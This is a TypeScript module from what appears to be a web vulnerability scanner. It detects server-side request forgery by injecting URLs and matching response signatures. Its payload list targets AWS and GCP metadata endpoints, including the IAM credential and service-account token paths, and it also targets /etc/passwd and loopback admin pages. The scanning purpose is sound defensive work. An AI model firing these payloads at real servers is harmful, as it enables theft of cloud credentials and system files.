// In-band SSRF oracle: the TARGET fetches a URL we inject (metadata / loopback / file://) and the
// RESPONSE carries the fetched content. Confirmation is a marker the control (a reserved .invalid host)
// lacks — never "the URL echoed back". Blind SSRF stays on probe_oob (Collaborator).

import { impactOracle } from "@veritas/scanner";

export const SSRF_CONTROL = "http://verdict-ssrf-control.invalid/";

/** High-signal destinations the target's server-side client might fetch. Ordered: cloud IMDS, then file://, then loopback. */
export const SSRF_PAYLOADS: readonly string[] = Object.freeze([
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
  "http://127.0.0.1/latest/meta-data/",
  "file:///etc/passwd",
  "file:///c:/windows/win.ini",
  "http://127.0.0.1/admin",
  "http://localhost/admin",
  "http://127.0.0.1/",
  "http://localhost/",
  "http://[::1]/",
]);

export interface SsrfHit {
  marker: string;
  detail: string;
}

const SSRF_SIGS: ReadonlyArray<{ re: RegExp; marker: string; detail: string }> = [
  { re: /\bami-id\b/, marker: "ami-id", detail: "AWS EC2 instance metadata" },
  { re: /\binstance-id\b/, marker: "instance-id", detail: "cloud instance metadata" },
  { re: /iam\/security-credentials/, marker: "iam/security-credentials", detail: "AWS IAM credentials via IMDS" },
  { re: /computeMetadata/i, marker: "computeMetadata", detail: "GCP metadata server" },
  { re: /\bami-launch-index\b/, marker: "ami-launch-index", detail: "AWS EC2 instance metadata" },
  { re: /\breservation-id\b/, marker: "reservation-id", detail: "AWS EC2 instance metadata" },
  { re: /"token_type"\s*:\s*"Bearer"/i, marker: '"token_type":"Bearer"', detail: "cloud metadata access token" },
];

/** Put `value` (the URL the server should fetch) into url/body. Needs {{SSRF}} or a query `param`. */
export function placeSsrfTarget(
  url: string,
  body: string | null | undefined,
  param: string | undefined,
  value: string,
): { url: string; body: string | null } | null {
  if (body != null && body.includes("{{SSRF}}")) return { url, body: body.replaceAll("{{SSRF}}", value) };
  if (url.includes("{{SSRF}}")) return { url: url.replaceAll("{{SSRF}}", encodeURIComponent(value)), body: body ?? null };
  if (param) {
    try {
      const u = new URL(url);
      u.searchParams.set(param, value);
      return { url: u.toString(), body: body ?? null };
    } catch {
      return null;
    }
  }
  return null;
}

/** Marker present in the payload response and absent from the control — fetched content, not an echo of our URL. */
export function ssrfHit(body: string, baselineBody: string, injectedUrl?: string): SsrfHit | null {
  const strip = (s: string): string => {
    if (!injectedUrl) return s;
    let out = s.split(injectedUrl).join("");
    try {
      out = out.split(encodeURIComponent(injectedUrl)).join("");
    } catch {
      /* ignore */
    }
    return out;
  };
  const b = strip(body);
  const c = strip(baselineBody);
  const impact = impactOracle(b, { baselineBody: c });
  const first = impact[0];
  if (first) return { marker: first.marker, detail: first.detail };
  for (const sig of SSRF_SIGS) {
    const m = b.match(sig.re);
    if (!m) continue;
    if (sig.re.test(c)) continue;
    return { marker: sig.marker, detail: sig.detail };
  }
  return null;
}
